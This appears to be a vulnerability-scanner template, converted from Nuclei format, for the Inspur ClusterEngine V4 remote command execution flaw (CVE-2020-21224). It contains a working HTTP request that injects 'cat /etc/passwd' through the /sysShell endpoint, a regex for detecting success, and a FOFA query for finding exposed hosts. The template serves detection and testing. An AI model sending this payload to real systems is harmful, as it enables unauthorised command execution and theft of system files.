@@ -1,0 +1,155 @@
+{
+  "id": "inspur-clusterengine-rce",
+  "name": "Inspur Clusterengine V4 SYSshell - Remote Command Execution",
+  "author": "ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.",
+  "references": [
+    "https://www.inspursystems.com/",
+    "https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce",
+    "https://nvd.nist.gov/vuln/detail/CVE-2020-21224",
+    "https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul"
+  ],
+  "tags": [
+    "inspur",
+    "clusterengine",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"TSCEV4.0\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cveId": "CVE-2020-21224",
+  "cweId": "CWE-88",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": true,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /sysShell HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded;charset\u003dUTF-8\nCookie: lang\u003dcn\n\nop\u003ddoPlease\u0026node\u003dcu01\u0026command\u003dcat+/etc/passwd\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "inspur-clusterengine-rce",
+    "info": {
+      "name": "Inspur Clusterengine V4 SYSshell - Remote Command Execution",
+      "author": "ritikchaddha",
+      "severity": "critical",
+      "description": "Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.",
+      "reference": [
+        "https://www.inspursystems.com/",
+        "https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce",
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-21224",
+        "https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cve_id": "CVE-2020-21224",
+        "cwe_id": "CWE-88"
+      },
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"TSCEV4.0\""
+      },
+      "tags": "inspur,clusterengine,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": true,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /sysShell HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded;charset\u003dUTF-8\nCookie: lang\u003dcn\n\nop\u003ddoPlease\u0026node\u003dcu01\u0026command\u003dcat+/etc/passwd\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
